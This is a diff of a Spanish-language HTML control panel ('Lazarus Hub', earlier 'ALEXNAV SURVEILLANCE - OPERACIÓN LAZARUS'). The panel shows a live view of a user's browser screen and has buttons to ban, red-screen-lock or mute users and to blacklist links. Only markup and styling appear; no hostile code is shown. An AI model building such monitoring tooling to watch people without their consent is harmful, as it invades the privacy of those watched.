@@ -2,57 +2,52 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Lazarus Command Center</title>
+    <title>Lazarus Hub | Control Panel</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 500px; gap: 20px; }
-        .card { border: 1px solid #00ff41; padding: 20px; background: rgba(0,255,65,0.05); border-radius: 12px; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        .sidebar { width: 350px; border-right: 1px solid #00ff41; padding: 20px; overflow-y: auto; background: #050505; }
+        .main-view { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+        .monitor { flex: 1; border: 2px solid #00ff41; background: white; border-radius: 10px; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
         
-        /* PANTALLA GRANDE */
-        #live-monitor { width: 100%; height: 500px; background: white; border: 4px solid #333; border-radius: 10px; }
-        
-        .controls input, .controls select, .controls button { 
-            width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #00ff41; color: #00ff41; font-weight: bold;
-        }
-        button:hover { background: #00ff41; color: #000; cursor: pointer; }
-        .danger { border-color: red !important; color: red !important; }
-        .danger:hover { background: red !important; color: white !important; }
+        .card { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
+        .btn { width: 100%; padding: 10px; margin-top: 5px; cursor: pointer; border: 1px solid #00ff41; background: none; color: #00ff41; font-weight: bold; }
+        .btn:hover { background: #00ff41; color: black; }
+        .btn-red { border-color: red; color: red; }
+        .btn-red:hover { background: red; color: white; }
     </style>
 </head>
 <body>
-    <h1>ALEXNAV SURVEILLANCE - OPERACIÓN LAZARUS</h1>
-    
-    <div class="grid">
+    <div class="sidebar">
+        <h2>CENTRAL LAZARUS</h2>
+        <div id="user-info" class="card">Selecciona un usuario...</div>
+        
         <div class="card">
-            <h3>MONITOR DE PANTALLA EN VIVO</h3>
-            <iframe id="live-monitor" src=""></iframe>
-            <h3>LOGS RECIENTES</h3>
-            <div id="logs-box" style="height: 200px; overflow-y: auto; font-size: 12px;"></div>
+            <h3>COMANDOS DE CONTROL</h3>
+            <input type="text" id="target" placeholder="ID Usuario" style="width:90%; padding:8px; margin-bottom:10px;">
+            <button class="btn btn-red" onclick="enviar('BAN')">BANEAR (ROJO)</button>
+            <button class="btn" onclick="enviar('UNBAN')">DESBANEAR</button>
+            <hr>
+            <button class="btn" style="color:orange; border-color:orange;" onclick="enviar('MUTE')">MUTEAR</button>
+            <button class="btn" onclick="enviar('UNMUTE')">DESMUTEAR</button>
         </div>
 
         <div class="card">
-            <h3>DISPOSITIVO DETECTADO: <span id="dev-name" style="color:white">Esperando...</span></h3>
-            <hr>
-            <div class="controls">
-                <input type="text" id="target-id" placeholder="ID DEL USUARIO">
-                
-                <button class="danger" onclick="enviar('BLOQUEAR')">BLOQUEAR NAVEGADOR (PANTALLA ROJA)</button>
-                
-                <div style="display:flex; gap:10px;">
-                    <input type="number" id="mute-mins" placeholder="Minutos" min="1" max="100" style="width:70px">
-                    <button onclick="enviar('MUTE')">MUTEAR (TIEMPO DE ESPERA)</button>
-                </div>
-
-                <button style="border-color:cyan; color:cyan" onclick="enviar('LIBERAR')">LIBERAR TODO</button>
-
-                <hr>
-                <h3>GESTIÓN DE LINKS PROHIBIDOS</h3>
-                <input type="text" id="bad-link" placeholder="ej: facebook.com">
-                <button onclick="bloquearLink()">AÑADIR A LISTA NEGRA</button>
-            </div>
+            <h3>BLOQUEAR LINK</h3>
+            <input type="text" id="bad-link" placeholder="facebook.com" style="width:90%; padding:8px;">
+            <button class="btn" onclick="bloquear()">AÑADIR BLACKLIST</button>
         </div>
     </div>
 
+    <div class="main-view">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2>PANTALLA EN TIEMPO REAL</h2>
+            <div id="last-seen">Sincronizando...</div>
+        </div>
+        <div class="monitor">
+            <iframe id="live-frame"></iframe>
+        </div>
+    </div>
     <script src="admin.js"></script>
 </body>
 </html>
